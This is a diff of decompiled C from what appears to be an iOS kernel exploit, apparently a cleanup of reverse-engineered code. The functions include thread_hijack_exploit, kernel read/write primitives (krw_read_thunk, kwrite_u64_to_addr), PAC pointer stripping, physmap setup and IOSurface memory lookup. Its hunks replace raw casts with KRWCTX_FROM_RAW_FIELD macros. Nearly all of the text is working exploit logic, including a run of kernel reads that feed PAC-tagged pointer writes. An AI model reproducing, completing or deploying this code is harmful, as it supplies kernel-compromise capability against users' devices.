@@ -16581,8 +16581,8 @@ __int64 __fastcall macho_walk_segment_by_name_impl(__int64 a1, unsigned __int64 
       if ( v16 <= v15 )
         return 0;
     }
-    if ( has_valid_krw_path((struct_krwCtx *)*(uint64_t *)(v9 + 280))
-      && krw_ctx_has_read_caps((struct_krwCtx *)*(uint64_t *)(v9 + 280))
+    if ( has_valid_krw_path(KRWCTX_FROM_RAW_FIELD(v9, 280))
+      && krw_ctx_has_read_caps(KRWCTX_FROM_RAW_FIELD(v9, 280))
       && (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280)) > *(uint32_t *)(v9 + 56)
       && v16 - v15 < (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280))
       && a4 > a3 )
@@ -16592,7 +16592,7 @@ __int64 __fastcall macho_walk_segment_by_name_impl(__int64 a1, unsigned __int64 
         v16 = v15 + (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280));
     }
     if ( (unsigned int)krw_read_thunk(
-                         *(struct_krwCtx **)(v9 + 280),
+                         KRWCTX_FROM_RAW_FIELD(v9, 280),
                          *(uint64_t *)(v9 + 224) - v10 + v15,
                          v16 - v15,
                          (void *)v15) )
@@ -16876,13 +16876,13 @@ bool __fastcall alloc_kernel_offset_table(__int64 a1, __int64 a2)
   *(uint64_t *)(a1 + 208) = (uint64_t)calloc(0x48u, 1u);
   if ( *(uint64_t *)(a1 + 208) )
   {
-    if ( krw_read_thunk(*(struct_krwCtx **)(a1 + 280), a2, 32, v15) )
+    if ( krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 280), a2, 32, v15) )
     {
       v5 = v15[5] + 32LL;
       v6 = calloc(v5, 1u);
       if ( v6 )
       {
-        if ( krw_read_thunk(*(struct_krwCtx **)(a1 + 280), a2, v5, v6) )
+        if ( krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 280), a2, v5, v6) )
         {
           **(uint64_t **)(a1 + 208) = v6;
           if ( *v6 == -17958194 )
@@ -17317,7 +17317,7 @@ __int64 __fastcall krw_ctx_setup_physmap(__int64 a1, uint64_t **a2, __int64 a3)
   *((uint64_t *)&v31 + 1) = -1;
   v10 = kobj_snapshot_pattern_search_via_ctx((__int64)a2, (__int64)&v33, (__int64)&v31, 4u);
   *(uint64_t *)(a1 + 120) = v10 - 8;
-  v11 = *(struct_krwCtx **)(a3 + 32);
+  v11 = KRWCTX_FROM_RAW_FIELD(a3, 32);
   v12 = kread_u64_value(a3, v10 + 16);
   v13 = krw_xpac_vaddr_2(v11, v12);
   v14 = 0;
@@ -17333,7 +17333,7 @@ __int64 __fastcall krw_ctx_setup_physmap(__int64 a1, uint64_t **a2, __int64 a3)
   }
   *(uint64_t *)(a1 + 112) = v13 + (v15 << 38 >> 36) + v14;
 LABEL_14:
-  v18 = *(struct_krwCtx **)(a3 + 32);
+  v18 = KRWCTX_FROM_RAW_FIELD(a3, 32);
   v19 = kread_u64_value(a3, *(uint64_t *)(a1 + 120) + 24LL);
   v20 = krw_xpac_vaddr_2(v18, v19);
   v21 = 0;
@@ -17501,14 +17501,14 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
   *(uint64_t *)(a2 + 24) = kread_u64_value(*(uint64_t *)a1, v6 + 72);
   v7 = kread_u64_value(*(uint64_t *)a1, v6);
   *(uint64_t *)(a2 + 32) = v7;
-  v8 = krw_xpac_vaddr_2(*(struct_krwCtx **)(*(uint64_t *)a1 + 32LL), v7);
+  v8 = krw_xpac_vaddr_2(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32), v7);
   v77 = xmmword_432E0;
   *(uint64_t *)(a2 + 16) = (*(__int64 (__fastcall **)(uint64_t, __int64, __int64, __int128 *))(**(uint64_t **)(a1 + 8) + 8LL))(
                            *(uint64_t *)(a1 + 8),
                            qword_480A0,
                            2,
                            &v77);
-  v9 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v9 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v10 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48048);
   v11 = krw_xpac_vaddr_2(v9, v10);
   v12 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48048;
@@ -17518,7 +17518,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v11,
           (v12 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4804A << 48));
   kwrite_u64_to_addr(v13, v12, v14);
-  v15 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v15 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v16 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_4804C);
   v17 = krw_xpac_vaddr_2(v15, v16);
   v18 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_4804C;
@@ -17528,7 +17528,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v17,
           (v18 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4804E << 48));
   kwrite_u64_to_addr(v19, v18, v20);
-  v21 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v21 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v22 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48050);
   v23 = krw_xpac_vaddr_2(v21, v22);
   v24 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48050;
@@ -17538,7 +17538,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v23,
           (v24 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48052 << 48));
   kwrite_u64_to_addr(v25, v24, v26);
-  v27 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v27 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v28 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48054);
   v29 = krw_xpac_vaddr_2(v27, v28);
   v30 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48054;
@@ -17548,7 +17548,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v29,
           (v30 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48056 << 48));
   kwrite_u64_to_addr(v31, v30, v32);
-  v33 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v33 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v34 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48058);
   v35 = krw_xpac_vaddr_2(v33, v34);
   v36 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48058;
@@ -17558,7 +17558,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v35,
           (v36 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4805A << 48));
   kwrite_u64_to_addr(v37, v36, v38);
-  v39 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v39 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v40 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_4805C);
   v41 = krw_xpac_vaddr_2(v39, v40);
   v42 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_4805C;
@@ -17568,7 +17568,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v41,
           (v42 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_4805E << 48));
   kwrite_u64_to_addr(v43, v42, v44);
-  v45 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v45 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v46 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48060);
   v47 = krw_xpac_vaddr_2(v45, v46);
   v48 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48060;
@@ -17578,7 +17578,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v47,
           (v48 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48062 << 48));
   kwrite_u64_to_addr(v49, v48, v50);
-  v51 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v51 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v52 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48070);
   v53 = krw_xpac_vaddr_2(v51, v52);
   v54 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48070;
@@ -17588,7 +17588,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           v53,
           (v54 & 0xFFFFFFFFFFFFLL) | ((unsigned __int64)(unsigned __int16)word_48072 << 48));
   kwrite_u64_to_addr(v55, v54, v56);
-  v57 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v57 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v58 = kread_u64_value(*(uint64_t *)a1, v8 + (unsigned __int16)word_48064);
   v59 = krw_xpac_vaddr_2(v57, v58);
   v60 = *(uint64_t *)(a2 + 16) + (unsigned __int16)word_48064;
@@ -17641,7 +17641,7 @@ __int64 __fastcall necp_set_opt_string_2(__int64 a1, __int64 a2)
           qword_480B0,
           1,
           &v77);
-  result = physmap_map_cached(*(struct_krwCtx **)(*(uint64_t *)a1 + 32LL), v75, a2 + 40);
+  result = physmap_map_cached(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32), v75, a2 + 40);
   **(uint64_t **)(a2 + 40) = 0;
   return result;
 }
@@ -17863,10 +17863,10 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   if ( v6 )
     return 5;
   v45 = kread_u64_value(*(uint64_t *)a1, v5);
-  v7 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v7 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v8 = kread_u64_value(*(uint64_t *)a1, *(uint64_t *)(*(uint64_t *)a1 + 16LL) + 40LL);
   v9 = krw_xpac_vaddr_2(v7, v8);
-  v10 = *(struct_krwCtx **)(*(uint64_t *)a1 + 32LL);
+  v10 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)a1, 32);
   v11 = kread_u64_value(*(uint64_t *)a1, v9 + 64);
   v12 = krw_xpac_vaddr_2(v10, v11);
   v57 = xmmword_432E0;
@@ -18159,6 +18159,7 @@ __int64 __fastcall iosurface_id_to_index(unsigned int a1)
 //----- (000000000001BE0C) ----------------------------------------------------
 __int64 __fastcall get_iosurface_mem_entry(__int64 a1, unsigned int a2, mach_port_name_t *a3)
 {
+  struct_krwCtx *ctx; // x20
   mach_port_name_t *v6; // x0
   mach_port_name_t *v7; // x20
   mach_port_name_t v8; // w1
@@ -18168,6 +18169,7 @@ __int64 __fastcall get_iosurface_mem_entry(__int64 a1, unsigned int a2, mach_por
   unsigned __int64 v12; // [xsp+0h] [xbp-30h] BYREF
   mach_port_name_t name; // [xsp+Ch] [xbp-24h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   name = 0;
   if ( *(uint64_t *)(a1 + 344) < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
   {
@@ -18199,9 +18201,9 @@ LABEL_7:
     {
       v11 = 12;
     }
-    if ( (unsigned int)lookup_physmap_page_slot((struct_krwCtx *)a1, v11, (__int64 *)&v12) && v12 )
+    if ( (unsigned int)lookup_physmap_page_slot(ctx, v11, (__int64 *)&v12) && v12 )
     {
-      result = plist_elem_is_string_6((struct_krwCtx *)a1, v12, &name);
+      result = plist_elem_is_string_6(ctx, v12, &name);
       if ( (uint32_t)result )
         return result;
       if ( name + 1 >= 2 )
